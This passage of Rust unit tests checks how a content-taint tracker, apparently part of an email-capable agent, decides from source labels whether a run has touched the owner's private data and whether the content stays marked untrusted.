        assert_eq!(sent["body"], "y");
    }

    #[test]
    fn only_labels_of_the_owners_private_data_make_a_run_private() {
        for label in [
            "page https://a.example/",
            "mission ledger",
            "own inbox INBOX",
        ] {
            let mut taint = ContentTaint::default();
            taint.note_label(label);
            assert!(!taint.private_source && !taint.seen.unhashed, "{label}");
            taint.note_label_hashed(label);
            assert!(!taint.private_source, "{label}");
            // Text that reads private by class under such a label is not the owner's either.
            taint.note_with_text(ContentClass::all(), label, "Some words here");
            assert!(!taint.private_source, "{label}");
            assert!(taint.exposure.untrusted, "{label} stays untrusted content");
        }
        for label in [
            "mailbox INBOX",
            "file customers.csv",
            "tool email_search",
            "another bot's reply",
            // Only the exact names count: a look-alike is a private label.
            "mission ledger 2",
            "own inbox",
        ] {
            let mut taint = ContentTaint::default();
            taint.note_label(label);
            assert!(taint.private_source && taint.seen.unhashed, "{label}");
        }
    }

    #[test]
    fn the_own_inbox_label_names_the_folder_and_the_wait_tool_reads_the_own_inbox() {
        assert_eq!(
            own_inbox_label(&json!({"folder": "Junk"})),
            "own inbox Junk"
        );
        assert_eq!(own_inbox_label(&json!({})), "own inbox INBOX");
        assert_eq!(source_label("email_wait_for", &json!({})), "own inbox mail");
        // The owner's own mailbox keeps its label.
        assert_eq!(source_label("email_search", &json!({})), "mailbox INBOX");
    }
}
